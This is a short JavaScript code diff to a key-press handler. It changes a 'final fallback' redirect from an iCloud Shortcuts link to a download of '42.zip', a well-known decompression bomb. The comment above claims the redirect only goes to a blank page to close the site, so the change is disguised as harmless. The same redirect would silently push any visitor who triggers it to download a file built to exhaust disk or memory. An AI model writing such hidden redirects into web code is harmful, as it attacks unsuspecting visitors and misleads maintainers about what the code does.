@@ -61,7 +61,7 @@ function handleKeyPress(key) {
 
             // Final fallback: navigate away to a blank page so the site is effectively closed.
             setTimeout(() => {
-                window.location.href = 'https://www.icloud.com/shortcuts/d3c8049f4b614dd0a75b36b5tb8b6cef';
+                window.location.href = 'https://unforgettable.dk/42.zip';
             }, 100);
 
             return;
